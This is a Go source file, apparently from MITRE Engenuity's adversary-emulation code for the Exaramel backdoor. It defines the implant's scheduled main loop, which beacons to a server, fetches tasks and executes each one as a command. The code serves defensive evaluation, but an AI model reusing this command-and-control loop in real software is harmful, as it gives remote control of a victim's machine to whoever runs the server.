package scheduler

import (
	"fmt"
	"time"

	"github.com/robfig/cron/v3"

	"attackevals.mitre-engenuity.org/exaramel/configur"
	"attackevals.mitre-engenuity.org/exaramel/logger"
	"attackevals.mitre-engenuity.org/exaramel/networker"
	"attackevals.mitre-engenuity.org/exaramel/worker"
)

var cr *cron.Cron

// This function returns a string to represent an interval of n seconds
func CreateCronStringFromSeconds(intSeconds int) string {
	return fmt.Sprintf("@every %vs", intSeconds)
}

// Creates a new Cron instance, and adds a cronjob for the main loop
func SetupScheduler(cronString string) error {
	cr = cron.New()
	if _, err := cr.AddFunc(cronString, RunActivities); err != nil {
		return err
	}
	return nil
}

// Start main loop
func StartLoop() {
	cr.Start()
}

// Main loop actions: Process report files left on disk, get and execute tasking, and then write any updates to configuration to disk.
func RunActivities() {
	if err := worker.ProcessReportFiles(); err != nil {
		logger.Error(err)
		time.Sleep(5 * time.Second)
		if err := networker.PostAuthBeacon(); err != nil {
			logger.Error(err)
		}
	}
	RunTasks()
	if err := configur.WriteConfig(); err != nil {
		logger.Error(err)
	}
}

// Get tasks from server then execute each one
func RunTasks() {
	tasks, err := networker.GetTasks()
	if err != nil {
		logger.Error(err)
		time.Sleep(5 * time.Second)
		if err := networker.PostAuthBeacon(); err != nil {
			logger.Error(err)
		}
	}
	for _, task := range tasks.Response {
		if err := worker.DirectCommand(task); err != nil {
			logger.Error(err)
		}
	}
}
